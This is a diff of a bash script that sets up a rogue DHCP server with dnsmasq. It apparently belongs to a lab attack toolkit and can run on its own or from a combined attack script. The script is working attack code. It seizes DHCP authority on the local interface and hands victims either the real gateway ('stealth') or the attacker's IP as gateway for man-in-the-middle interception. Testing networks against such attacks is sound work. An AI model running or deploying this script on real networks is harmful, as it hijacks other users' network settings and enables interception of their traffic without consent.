@@ -1,48 +1,41 @@
-#!/bin/bash
+#!/usr/bin/env bash
+# Rogue DHCP server (dnsmasq).
+#
+# Called by dhcp_attack_combined.sh — packages and MitM setup done there.
+# Can also run standalone if packages already installed.
+#
+# Env vars (set by combined script):
+#   IFACE    — network interface (default: auto-detect)
+#   ROGUE_GW — gateway IP to advertise to victims
+#              stealth: real gateway  |  mitm: attacker IP
+#
+# Standalone usage:
+#   sudo ROGUE_GW=10.10.20.1 bash rogue_dhcp_server.sh          # stealth
+#   sudo ROGUE_GW=10.10.20.151 bash rogue_dhcp_server.sh        # mitm
 
-set -e
+set -uo pipefail
 
-INTERFACE=$(ip -o -4 route show to default | awk '{print $5; exit}')
-LEASE_RANGE="10.10.20.210,10.10.20.220,12h" # lease range for rogue DHCP server can be adjusted as needed as unused ip range 
-GATEWAY=$(ip route | awk '/default/ {print $3; exit}') # this is a stealth attack, so we will use the real gateway as the default gateway for the rogue DHCP server.
-DNS=$(resolvectl dns "$INTERFACE" | awk '{print $4; exit}')
+[[ $EUID -ne 0 ]] && { echo "[ERROR] Run as root."; exit 1; }
 
-if [[ $EUID -ne 0 ]]; then
-    echo "[ERROR] Please run as root."
-    exit 1
-fi
+IFACE="${IFACE:-$(ip -o -4 route show to default | awk '{print $5; exit}')}"
+REAL_GW=$(ip route | awk '/default/ {print $3; exit}')
+ROGUE_GW="${ROGUE_GW:-$REAL_GW}"   # default stealth (real GW) if not set
+DNS=$(resolvectl dns "$IFACE" 2>/dev/null | awk '{print $4; exit}')
+LEASE_RANGE="10.10.20.210,10.10.20.220,12h"
 
-echo "[*] Checking required packages..."
+echo "[rogue] Interface : $IFACE"
+echo "[rogue] Gateway   : $ROGUE_GW"
+echo "[rogue] DNS       : $DNS"
+echo "[rogue] Pool      : $LEASE_RANGE"
 
-PACKAGES=(
-    dnsmasq
-    isc-dhcp-client
-    tcpdump
-    nmap
-    python3-scapy
-)
-
-for pkg in "${PACKAGES[@]}"; do
-    if ! dpkg -s "$pkg" >/dev/null 2>&1; then
-        echo "[*] Installing $pkg..."
-        apt-get update
-        apt-get install -y "$pkg"
-    else
-        echo "[+] $pkg already installed."
-    fi
-done
-
-echo "[*] Stopping any existing dnsmasq..."
 systemctl stop dnsmasq 2>/dev/null || true
 pkill dnsmasq 2>/dev/null || true
 
-echo "[*] Starting rogue DHCP server..."
-
-dnsmasq \
+exec dnsmasq \
     --no-daemon \
     --bind-interfaces \
-    --interface="$INTERFACE" \
+    --interface="$IFACE" \
     --dhcp-authoritative \
     --dhcp-range="$LEASE_RANGE" \
-    --dhcp-option=3,"$GATEWAY" \
+    --dhcp-option=3,"$ROGUE_GW" \
     --dhcp-option=6,"$DNS"
